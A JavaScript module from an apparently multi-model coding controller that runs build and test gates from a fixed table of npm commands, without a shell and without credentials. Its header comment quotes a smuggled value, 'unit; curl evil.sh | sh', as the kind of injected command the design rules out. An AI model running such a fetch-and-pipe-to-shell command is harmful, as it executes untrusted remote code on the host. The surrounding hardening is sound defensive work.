/**
 * The gates, and the reason they are a table and not a string.
 *
 * GPT proposes work and reviews it. It never says what the controller executes.
 * A TaskSpec names gates from a closed enum; this file is the only place those
 * names become commands, and the commands are literal argument arrays — so
 * `"unit; curl evil.sh | sh"` is not a gate that fails, it is a value that
 * cannot be expressed. Structural, not filtered.
 *
 * The other half of the same principle: the controller runs these itself, in
 * the worktree, after the worker has returned. "Claude says the tests pass" is
 * a sentence, not evidence.
 */

import { spawn } from 'node:child_process';
import { redact } from './redaction.mjs';
import { gateEnv } from './child-env.mjs';
import { CODES, fail } from './errors.mjs';

/** The closed set. Adding a gate is a code change in this repository. */
export const GATES = Object.freeze({
  typecheck: Object.freeze(['npm', 'run', 'typecheck']),
  lint: Object.freeze(['npm', 'run', 'lint']),
  unit: Object.freeze(['npm', 'test']),
  build: Object.freeze(['npm', 'run', 'build']),
  e2e: Object.freeze(['npm', 'run', 'test:e2e']),
});

export const GATE_NAMES = Object.freeze(Object.keys(GATES));

/** Lookup that cannot be walked out of via prototype keys. */
export function commandFor(name) {
  if (typeof name !== 'string' || !Object.hasOwn(GATES, name)) {
    fail(CODES.UNKNOWN_GATE, `not a known gate: ${JSON.stringify(String(name)).slice(0, 80)}`);
  }
  return [...GATES[name]];
}

const TAIL_BYTES = 4000;

const tail = (s) => {
  const t = s.length > TAIL_BYTES ? `…(${s.length - TAIL_BYTES} bytes elided)…\n${s.slice(-TAIL_BYTES)}` : s;
  return redact(t);
};

/**
 * Run one gate. No shell: `spawn` with an argument array, so nothing in the
 * environment or the TaskSpec can be interpreted as syntax.
 *
 * And no credentials. A gate runs repository code that a model just wrote — a
 * test file, a build step, a config plugin. `env: process.env` meant any of
 * that could read OPENAI_API_KEY, the owner's GitHub token, or npm auth. The
 * gate needs PATH, HOME and the ordinary build environment; it has never needed
 * a credential, and now it cannot have one (D62).
 */
export async function runGate(name, { cwd, timeoutMs = 30 * 60_000, spawnImpl = spawn, env: envSource } = {}) {
  const [command, ...args] = commandFor(name);
  const startedAt = Date.now();
  const { env } = gateEnv({ source: envSource ?? process.env });

  return new Promise((resolve) => {
    const child = spawnImpl(command, args, {
      cwd,
      shell: false,
      env,
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    let out = '';
    let err = '';
    let timedOut = false;
    child.stdout?.on('data', (d) => {
      out += d;
    });
    child.stderr?.on('data', (d) => {
      err += d;
    });

    const timer = setTimeout(() => {
      timedOut = true;
      child.kill('SIGKILL');
    }, timeoutMs);

    child.on('error', (e) => {
      clearTimeout(timer);
      resolve({
        gate: name,
        ok: false,
        exitCode: null,
        durationMs: Date.now() - startedAt,
        tail: redact(`could not start ${command}: ${e.message}`),
      });
    });

    child.on('close', (code) => {
      clearTimeout(timer);
      resolve({
        gate: name,
        ok: code === 0 && !timedOut,
        exitCode: code,
        timedOut,
        durationMs: Date.now() - startedAt,
        tail: tail(`${out}\n${err}`.trim()),
      });
    });
  });
}

/**
 * Run the required gates in order and stop at the first failure.
 *
 * Stopping early is deliberate: a failed typecheck makes the e2e result
 * meaningless, and a repair turn is more useful with one true cause than with
 * five downstream symptoms.
 */
export async function runGates(names, options = {}) {
  const results = [];
  for (const name of names) {
    const result = await runGate(name, options);
    results.push(result);
    if (!result.ok) break;
  }
  return {
    results,
    ok: results.length === names.length && results.every((r) => r.ok),
    failed: results.filter((r) => !r.ok).map((r) => r.gate),
    skipped: names.slice(results.length),
  };
}
